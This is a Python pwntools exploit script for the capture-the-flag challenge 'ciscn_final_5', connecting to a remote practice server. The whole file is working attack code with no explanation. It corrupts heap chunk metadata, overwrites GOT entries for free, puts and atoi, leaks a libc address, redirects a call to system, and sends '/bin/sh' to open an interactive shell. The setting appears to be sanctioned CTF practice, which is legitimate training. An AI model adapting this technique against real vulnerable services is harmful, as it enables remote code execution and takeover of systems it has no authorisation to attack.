#!/usr/bin/env python
# coding=utf-8
from pwn import *
sh=process('./ciscn_final_5')
sh=remote('node3.buuoj.cn',26368)
elf=ELF('./ciscn_final_5')
libc=ELF('./libc.so.6')
#libc=elf.libc
#context.log_level='debug'   

def New(index, size, content):
    sh.recvuntil('choice: ')
    sh.sendline('1')
    sh.recvuntil('index: ')
    sh.sendline(str(index))
    sh.recvuntil('size: ')
    sh.sendline(str(size))
    sh.recvuntil('content: ')
    sh.send(content)

def Delete(index):
    sh.recvuntil('choice: ')
    sh.sendline('2')
    sh.recvuntil('index: ')
    sh.sendline(str(index))

def Edit(index, content):
    sh.recvuntil('choice: ')
    sh.sendline('3')
    sh.recvuntil('index: ')
    sh.sendline(str(index))
    sh.recvuntil('content: ')
    sh.send(content)

New(16, 0x10, p64(0)+p64(0x91))#0
New(1, 0xc0, 'a')#1
Delete(1)
Delete(0)
New(2, 0x80, p64(0)+p64(0xd1)+p64(0x6020e0))
New(3, 0xc0, 'aa')
New(4, 0xc0, p64(elf.got['free'])+p64(elf.got['puts'])+p64(0x6020e1)+p64(elf.got['atoi']+4)+p64(0)*16+p32(0x10)*8)
Edit(8, p64(elf.plt['puts'])*2)
Delete(0)
puts_addr=u64(sh.recv(6).ljust(8, '\x00'))
libc_base=puts_addr-libc.sym['puts']
log.success('libc base: '+hex(libc_base))
#main_arena_offset=0x3ebc40
#main_arena=libc_base+main_arena_offset
#one_gadget=[0x4f2c5, 0x4f322, 0x10a38c]
#Edit(1, p64(main_arena-0x10))
#Edit(0, p64(one_gadget[1]+libc_base))
log.success('system addr: '+hex(libc_base+libc.sym['system']))
Edit(0xc, p64(libc_base+libc.sym['system'])*2)
sh.recvuntil('choice: ')
#sh.sendline('1')
#sh.recvuntil('index: ')
sh.sendline('/bin/sh\x00')
#sh.recvuntil('size: ')
#sh.sendline('1')
#New(4, 0x30, p64(elf.plt['printf']))
sh.interactive()


















